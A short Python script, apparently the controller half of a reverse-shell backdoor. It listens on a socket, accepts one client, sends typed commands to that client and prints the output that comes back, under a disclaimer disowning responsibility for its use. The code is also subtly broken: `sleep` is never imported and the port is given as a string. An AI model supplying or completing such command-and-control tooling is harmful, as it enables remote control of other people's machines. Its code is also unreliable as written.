#Made by Asher Buechel
#I am not responsible for anything you do with this.

import socket

HOST = 'PUT YOUR SERVER IP HERE'
HOST_PORT = 'PUT SERVER PORT HERE'
server = socket.socket()
server.bind((HOST, HOST_PORT))
print('Server started up and ready to connect to client.')
sleep(2) #I like these pauses, I think they are cool.
print('Listening for client...')
server.listen(1)
client, client_addr = server.accept()
print(f'{client_addr} Client connected to the server.')

while True:
    command = input('Enter a command here.')
    command = command.encode()
    client.send(command)
    print('Command sent to the client...')
    sleep(5)
    print('Client received the command from the server.')
    output = client.recv(4000)
    output = output.decode()
    print(f'Output: {output}')